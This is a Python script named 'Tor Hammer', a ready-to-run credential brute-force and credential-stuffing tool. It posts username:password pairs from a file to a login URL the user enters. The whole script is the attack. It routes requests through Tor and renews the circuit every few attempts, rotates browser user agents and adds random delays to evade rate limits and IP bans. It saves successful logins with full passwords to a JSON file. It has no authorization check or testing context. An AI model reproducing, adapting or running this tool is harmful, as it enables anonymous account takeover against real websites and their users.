#!/usr/bin/env python3
"""
TOR BRUTE FORCER
"""
import requests
from stem import Signal
from stem.control import Controller
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import json
import socks
import socket
from colorama import init, Fore, Back, Style
import sys

# Initialize colorama for colored output
init(autoreset=True)

# THOR HAMMER ASCII BANNER
def print_banner():
    banner = f"""
{Fore.YELLOW + Style.BRIGHT}
          ⚡      ⚡        ⚡      ⚡        ⚡
     ⚡         /\\/\\/\\        ⚡       /\\/\\/\\
              / /\\  /\\
{Fore.RED + Style.BRIGHT}
████████╗ ██████╗ ██████╗     ██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗
╚══██╔══╝██╔═══██╗██╔══██╗    ██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
   ██║   ██║   ██║██████╔╝    ███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
   ██║   ██║   ██║██╔══██╗    ██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██║    ██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝

{Fore.YELLOW + Style.BRIGHT}
                ⚡    ⚡   T O R   H A M M E R   ⚡    ⚡
           ⚡         ⚡                    ⚡         ⚡
                /\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\
{Fore.CYAN}
                  Hammer of the Hidden Storm
{Style.RESET_ALL}
    """
    print(banner)

# THOR FINAL STATS
def print_final_stats(hits_count):
    stats = f"""
{Fore.RED + Style.BRIGHT}
🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨
🎯 THOR STRUCK {hits_count} valid 200s!
🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨🔨
{Style.RESET_ALL}
    """
    print(stats)

class TorBruteForcer:
    def __init__(self, target_url, credentials_file, tor_port=9050, control_port=9051, 
                 control_password=None, threads=2, circuit_refresh=8):
        self.target_url = target_url
        self.threads = threads
        self.circuit_refresh = circuit_refresh
        
        # Load credentials
        with open(credentials_file, 'r') as f:
            self.credentials = [line.strip().split(':') for line in f if ':' in line]
        
        # Tor session
        self.session = requests.Session()
        self.session.proxies = {
            'http': f'socks5h://127.0.0.1:{tor_port}',
            'https': f'socks5h://127.0.0.1:{tor_port}'
        }
        
        # Tor control
        self.control = None
        self.connect_tor_control(control_port, control_password)
        self.attempt_count = 0
        self.lock = threading.Lock()
        
        # Results storage (only 200 successes)
        self.hits = []
    
    def connect_tor_control(self, control_port, password):
        try:
            self.control = Controller.from_port(port=control_port)
            if password:
                self.control.authenticate(password=password)
            else:
                self.control.authenticate()
            print(f"{Fore.GREEN}[+] Tor control connected{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Tor control failed: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Run: echo 'ControlPort 9051' >> /etc/tor/torrc && service tor restart{Style.RESET_ALL}")
            sys.exit(1)
    
    def renew_circuit(self):
        with self.lock:
            self.attempt_count += 1
            if self.attempt_count % self.circuit_refresh == 0:
                print(f"{Fore.CYAN}[*] Renewing Tor circuit...{Style.RESET_ALL}")
                self.control.signal(Signal.NEWNYM)
                time.sleep(3)
                print(f"{Fore.CYAN}[+] New circuit active{Style.RESET_ALL}")
    
    def get_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def test_credential(self, username, password):
        try:
            data = {'username': username, 'password': password}  # Customize fields
            
            time.sleep(random.uniform(2, 6))
            
            response = self.session.post(
                self.target_url,
                data=data,
                headers=self.get_headers(),
                timeout=15,
                allow_redirects=False
            )
            
            status = response.status_code
            self.renew_circuit()
            
            # Color logic
            if status == 200:
                color = Fore.GREEN
                success = True
            elif status in [404, 403]:
                color = Fore.RED
                success = False
            else:  # 302, 429, etc.
                color = Fore.YELLOW
                success = False
            
            # Console output for ALL requests
            print(f"{color}[{status}] {username}:{password[:4]}**** | {len(response.text)} bytes{Style.RESET_ALL}")
            
            # ONLY 200 responses to hits (with THOR HAMMER prefix)
            if status == 200:
                hit = {
                    'status': 'SUCCESS_200',
                    'username': username,
                    'password': password,
                    'response_length': len(response.text),
                    'redirect': response.url
                }
                with self.lock:
                    self.hits.append(hit)
                print(f"{Fore.RED + Style.BRIGHT}🔨 THOR HAMMER: [HIT!] {username}:{password}{Style.RESET_ALL}")
            
            return {'status': 'OK' if success else 'FAIL', 'username': username}
            
        except Exception as e:
            print(f"{Fore.RED}[!] ERR {username}: {str(e)[:40]}{Style.RESET_ALL}")
            return {'status': 'ERROR', 'username': username}
    
    def run(self):
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Credentials: {len(self.credentials)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {self.threads} | Circuit every {self.circuit_refresh}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_credential, cred[0], cred[1]) 
                      for cred in self.credentials]
            
            for future in futures:
                future.result()
        
        return self.hits

# INTERACTIVE USAGE
if __name__ == "__main__":
    print_banner()  # THOR HAMMER ASCII banner
    
    # Ask for target interactively
    target = input(f"{Fore.CYAN}Enter target URL (ex: https://site.com/login): {Style.RESET_ALL}").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # Check credentials file
    creds_file = input(f"{Fore.CYAN}Credentials file [credentials.txt (USERNAME:PASS)]: {Style.RESET_ALL}").strip() or 'credentials.txt'
    
    try:
        forcer = TorBruteForcer(
            target_url=target,
            credentials_file=creds_file,
            threads=2,
            circuit_refresh=8
        )
        
        hits = forcer.run()
        
        # Save ONLY successful 200s to JSON
        if hits:
            with open("hits_200.json", "w") as f:
                json.dump(hits, f, indent=2)
            print(f"{Fore.GREEN}[+] {len(hits)} hits saved to hits_200.json{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] No 200 responses found{Style.RESET_ALL}")
        
        # THOR FINAL STATS
        print_final_stats(len(hits))
            
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Credentials file '{creds_file}' not found!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Create with: echo 'admin:admin' > {creds_file}{Style.RESET_ALL}")
